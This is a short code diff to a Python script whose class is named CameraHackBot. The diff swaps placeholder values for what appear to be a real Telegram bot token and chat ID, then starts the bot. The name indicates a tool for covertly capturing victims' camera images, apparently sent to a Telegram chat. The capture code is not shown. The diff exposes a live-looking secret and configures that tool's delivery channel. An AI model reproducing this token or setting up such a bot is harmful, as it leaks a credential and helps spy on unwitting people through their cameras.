@@ -60,8 +60,8 @@ class CameraHackBot:
 
 if __name__ == "__main__":
     # Replace with your bot token and chat ID before running
-    BOT_TOKEN = 'YOUR_BOT_TOKEN'
-    CHAT_ID = 'YOUR_CHAT_ID'
+    BOT_TOKEN = '7988980652:AAEwulUH_jamMyYtO5B6soMJnEuwoUUBPDU'
+    CHAT_ID = '-1002862160926'
 
     bot = CameraHackBot(BOT_TOKEN, CHAT_ID)
     bot.start()
